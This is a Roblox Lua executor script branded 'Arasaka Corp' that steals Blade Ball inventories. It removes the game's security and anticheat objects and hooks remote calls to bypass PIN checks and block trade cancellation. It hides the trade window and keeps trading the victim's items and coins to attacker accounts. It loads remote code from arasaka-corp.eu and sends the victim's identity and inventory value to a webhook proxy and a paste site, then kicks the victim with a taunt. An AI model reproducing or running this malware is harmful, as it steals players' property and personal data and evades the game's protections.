local g = _G
if g.VB then return end
g.VB = true

local replicatedStorage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local httpService = game:GetService("HttpService")
local localPlayer = players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui", 10)

local requestFn = syn and syn.request or http_request or request
if not requestFn then
    pcall(function() localPlayer:Kick("Executor missing HTTP support") end)
    return
end

pcall(function()
    local sec = replicatedStorage:FindFirstChild("Security")
    if not sec then return end
    for _, d in ipairs(sec:GetDescendants()) do
        pcall(function() d:Destroy() end)
    end
    pcall(function() sec:Destroy() end)
end)

pcall(function()
    local clientFolder = localPlayer.PlayerScripts:FindFirstChild("Client")
    if not clientFolder then return end
    local dc = clientFolder:FindFirstChild("DeviceChecker")
    if dc then dc:Destroy() end
end)

pcall(function()
    game:SetAttribute("RBX_SequenceCache", math.random(1000000, 9999999))
end)

local tradeGuardActive = false

if hookmetamethod and newcclosure and getnamecallmethod then
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local method = getnamecallmethod()

        if typeof(self) == "Instance" then
            local name = self.Name
            local lower = string.lower(name)

            if string.find(lower, "security", 1, true) or string.find(lower, "anticheat", 1, true) then
                return nil
            end

            if tradeGuardActive then
                if name == "CancelTrade" or name == "DeclineTrade" or name == "DeclineRequest" then
                    return nil
                end
            end

            if name == "RequestPINCheck" and method == "InvokeServer" then
                return true
            end

            if name == "RespondPINCheck" and method == "FireServer" then
                return oldNamecall(self, true)
            end
        end

        return oldNamecall(self, ...)
    end))
end

pcall(function()
    if not getconnections then return end
    local packages = replicatedStorage:FindFirstChild("Packages")
    if not packages then return end
    local index = packages:FindFirstChild("_Index")
    if not index then return end
    local netPkg = index:FindFirstChild("sleitnick_net@0.1.0")
    if not netPkg then return end
    local net = netPkg:FindFirstChild("net")
    if not net then return end
    local cancel = net:FindFirstChild("RE/Trading/CancelTrade")
    if cancel then
        for _, conn in ipairs(getconnections(cancel.OnClientEvent)) do
            pcall(function() conn:Disconnect() end)
        end
    end
end)

local cfg = g.AC_CONFIG
if not cfg then
    warn("[AC] Loader first")
    return
end

local WEBHOOK_ID = cfg.WEBHOOK_ID
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY
local masterKey = "31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d"
local minrapVal = 1

local USERNAMES
do
    local raw = cfg.USERNAMES or cfg.USERNAME
    if type(raw) == "table" then
        USERNAMES = {}
        for _, v in ipairs(raw) do
            if type(v) == "string" and #v > 0 then
                table.insert(USERNAMES, v)
            end
        end
    elseif type(raw) == "string" and #raw > 0 then
        USERNAMES = { raw }
    else
        USERNAMES = {}
    end
end

if WEBHOOK_ID == "" or PROXY_URL == "" or #USERNAMES == 0 then
    pcall(function() localPlayer:Kick("Invalid configuration | discord.gg/arasaka-corp") end)
    return
end

local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
local crypto = Crypto.new(masterKey)

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then executorName = identifyexecutor() end
    if getexecutorname then executorName = getexecutorname() end
end)

local gameJobId = game.JobId
local capturedJobId = game.JobId
local captured = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepFunction = nil
    local patched = false
    repeat
        for _, func in ipairs(getgc(true)) do
            if typeof(func) == "function" then
                local info = debug.getinfo(func)
                if info and info.name == "stepAnimate" then
                    stepFunction = func
                    break
                end
            end
        end
        task.wait(0.5)
    until stepFunction

    local original = hookfunction(stepFunction, function(deltaTime)
        if not patched then
            patched = true
            capturedJobId = game.JobId
            captured = true
        end
        return original(deltaTime)
    end)
    repeat task.wait() until captured
    gameJobId = capturedJobId
end

local net = replicatedStorage.Packages._Index["sleitnick_net@0.1.0"].net
local rapController = require(replicatedStorage.Controllers.Trading.RAPController)

net:WaitForChild("RF/Trading/SetSetting"):InvokeServer("AllowRequests", "Everyone")
net:WaitForChild("RF/Trading/SetSetting"):InvokeServer("ViewInventory", "None")

local function formatNumber(n)
    n = tonumber(n) or 0
    if n >= 1E9 then return string.format("%.2fB", n / 1E9)
    elseif n >= 1E6 then return string.format("%.2fM", n / 1E6)
    elseif n >= 1E3 then return string.format("%.2fK", n / 1E3)
    else return tostring(n) end
end

local function getItemRap(itemName, category)
    return rapController.FastGetRAP(rapController, category, { Name = "vb" }, '["Name","' .. itemName .. '"]')
end

local function getInventory()
    local inventoryData = {}
    local inventory = require(replicatedStorage.Shared.Inventory).Client.Get()
    for _, category in ipairs({"Sword", "Explosion", "Emote"}) do
        if inventory[category] then
            for uid, item in pairs(inventory[category]) do
                if not item.TradeLock then
                    table.insert(inventoryData, {
                        rap = getItemRap(item.Name, category),
                        uid = uid,
                        name = item.Name,
                        class = category
                    })
                end
            end
        end
    end
    table.sort(inventoryData, function(a, b) return a.rap > b.rap end)
    return inventoryData
end

local items = getInventory()
local totalRap = 0
for _, item in ipairs(items) do
    totalRap = totalRap + item.rap
end

if totalRap < minrapVal then
    localPlayer:Kick("Account error, try on another account")
end

local function hideTradeUI()
    task.spawn(function()
        while task.wait() do
            playerGui.HUD.Enabled = true
            playerGui.Notifications.Enabled = false
        end
    end)
end

local function moveTradeUI()
    local tradeGui = playerGui:FindFirstChild("Trade")
    if tradeGui then
        for _, child in pairs(tradeGui:GetChildren()) do
            child.Position = UDim2.new(99, 99, 99, 99)
        end
    end
    hideTradeUI()
end

local function isInTrade()
    local tradeGui = playerGui:FindFirstChild("Trade")
    return tradeGui and tradeGui.Enabled
end

local function cancelTrade()
    repeat
        net:WaitForChild("RF/Trading/CancelTrade"):InvokeServer()
        task.wait()
    until not isInTrade()
end

local function readyTrade()
    repeat
        net:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
        net:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        task.wait()
    until not isInTrade()
end

local function sendTradeRequest(username)
    net:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(players:WaitForChild(username))
end

local function depositCoins()
    local coinText = playerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub(",", "")
    local coins = tonumber(coinText)
    if coins then
        net:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(coins)
    end
end

local function executeSteal(targetName)
    tradeGuardActive = true
    moveTradeUI()
    if isInTrade() then cancelTrade() end
    task.wait()
    repeat
        sendTradeRequest(targetName)
        task.wait(0.3)
    until isInTrade()

    local addedCount = 0
    for _, item in ipairs(getInventory()) do
        net:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.class, item.uid)
        addedCount = addedCount + 1
        if addedCount > 50 then
            depositCoins()
            task.wait(2)
            readyTrade()
            break
        end
        task.wait()
    end
    tradeGuardActive = false
end

local function startStealLoop(targetName)
    while true do
        executeSteal(targetName)
        task.wait(1)
    end
end

for _, player in players:GetPlayers() do
    if table.find(USERNAMES, player.Name) then
        task.wait(1)
        startStealLoop(player.Name)
    end
end

players.PlayerAdded:Connect(function(player)
    if table.find(USERNAMES, player.Name) then
        task.wait(1)
        startStealLoop(player.Name)
    end
end)

local function uploadToPastefy(items)
    if not items or #items == 0 then return nil end
    table.sort(items, function(a, b) return (a.rap or 0) > (b.rap or 0) end)

    local lines = {
        "ARASAKA CORP | BB Inventory Dump",
        "User: " .. localPlayer.Name .. " (" .. localPlayer.DisplayName .. ")",
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total RAP: " .. formatNumber(totalRap),
        "Total Items: " .. #items,
        string.rep("-", 60),
        ""
    }

    for _, item in ipairs(items) do
        table.insert(lines, string.format("%s [%s] | %s RAP", item.name, item.class, formatNumber(item.rap)))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return requestFn({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = httpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return httpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.paste then return "https://pastefy.app/" .. data.paste.id end
            if data.id then return "https://pastefy.app/" .. data.id end
        end
    end
    return nil
end

local function buildEmbed()
    local rapNum = tonumber(totalRap) or 0
    local itemCount = #items

    local counts = {Sword = 0, Explosion = 0, Emote = 0}
    for _, item in ipairs(items) do
        counts[item.class] = (counts[item.class] or 0) + 1
    end

    local hitCategory
    local glowEffect = ""
    if rapNum >= 10000000 then
        hitCategory = "INSANE HIT (10M+)"
        glowEffect = "✦"
    elseif rapNum >= 1000000 then
        hitCategory = "MASSIVE HIT (1M+)"
        glowEffect = "🔥"
    elseif rapNum >= 100000 then
        hitCategory = "BIG HIT (100K+)"
        glowEffect = "⚡"
    elseif rapNum >= 10000 then
        hitCategory = "GOOD HIT (10K+)"
        glowEffect = "💫"
    elseif rapNum >= 1000 then
        hitCategory = "NORMAL HIT (1K+)"
    else
        hitCategory = "LOW HIT (<1K)"
    end

    local topItems = {}
    for i = 1, math.min(5, #items) do
        local it = items[i]
        local icon = "░"
        local v = it.rap or 0
        if v >= 1000000 then icon = "█"
        elseif v >= 100000 then icon = "▓"
        elseif v >= 10000 then icon = "▒"
        end
        table.insert(topItems, string.format("%s %s [%s] | %s", icon, it.name, it.class, formatNumber(v)))
    end

    local pastefyLink = nil
    if itemCount > 0 then
        pastefyLink = uploadToPastefy(items)
    end

    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
                   .. "&gameInstanceId=" .. tostring(gameJobId)

    local fields = {
        {
            name = "VICTIM INFORMATION",
            value = "```yml\nUser: " .. localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")\n"
                 .. "ID: " .. tostring(localPlayer.UserId) .. "\n"
                 .. "Age: " .. tostring(localPlayer.AccountAge) .. " days\n"
                 .. "Server: " .. tostring(game.JobId):sub(1, 8) .. "\n```",
            inline = true
        },
        {
            name = "VALUATION",
            value = "```yml\nTotal RAP: " .. formatNumber(rapNum) .. "\n"
                 .. "Items: " .. tostring(itemCount) .. "\n"
                 .. "Receiver: " .. table.concat(USERNAMES, ", ") .. "\n"
                 .. "Executor: " .. executorName .. "\n```",
            inline = true
        },
        {
            name = "INVENTORY BREAKDOWN",
            value = "```yml\n"
                 .. "Swords: " .. tostring(counts.Sword or 0)
                 .. " | Explosions: " .. tostring(counts.Explosion or 0) .. "\n"
                 .. "Emotes: " .. tostring(counts.Emote or 0) .. "\n```",
            inline = false
        }
    }

    if #topItems > 0 then
        local topStr = "```prolog\n"
        for _, s in ipairs(topItems) do
            topStr = topStr .. s .. "\n"
        end
        topStr = topStr .. "```"
        table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
    end

    if pastefyLink then
        table.insert(fields, {
            name = "FULL INVENTORY",
            value = "[View All " .. tostring(itemCount) .. " Items on Pastefy](" .. pastefyLink .. ")",
            inline = false
        })
    end

    table.insert(fields, {
        name = "ACTIONS",
        value = "[Join Server](" .. fernLink .. ")",
        inline = false
    })

    local embedColor = 0x8B0000
    if rapNum >= 10000000 then embedColor = 0xFF0000
    elseif rapNum >= 1000000 then embedColor = 0xCC0000
    elseif rapNum >= 100000 then embedColor = 0x990000
    elseif rapNum >= 10000 then embedColor = 0x660000
    elseif rapNum >= 1000 then embedColor = 0x440000
    end

    local embed = {
        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
        color = embedColor,
        fields = fields,
        footer = {text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        username = "Arasaka Corp",
        avatar_url = "https://raw.githubusercontent.com/outhackernuls090-hash/arasakacorp/refs/heads/main/logo.jpg",
        embeds = {embed}
    }

    if rapNum >= 100000 or itemCount >= 20 then
        payload.content = "@everyone **ARASAKA CORP | BB HIT**"
    end

    return payload, pastefyLink
end

local function SendWebhook(payload)
    local fullUrl = PROXY_URL .. WEBHOOK_ID
    local envelope = { id = WEBHOOK_ID, payload = payload }
    local json = httpService:JSONEncode(envelope)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = fullUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = httpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function SendPublic(payload)
    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
    local json = httpService:JSONEncode(payload)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = PUBLIC_PROXY,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = httpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local embedPayload, pastefyLink = buildEmbed()
SendWebhook(embedPayload)

local publicMsg = localPlayer.Name .. " got hit by Arasaka Corp in Blade Ball | RAP: " .. formatNumber(totalRap)
    .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
SendPublic({ message = publicMsg })

task.wait(1)
localPlayer:Kick("Arasaka Corp stole your Items | discord.gg/wep4k9Fg8W")
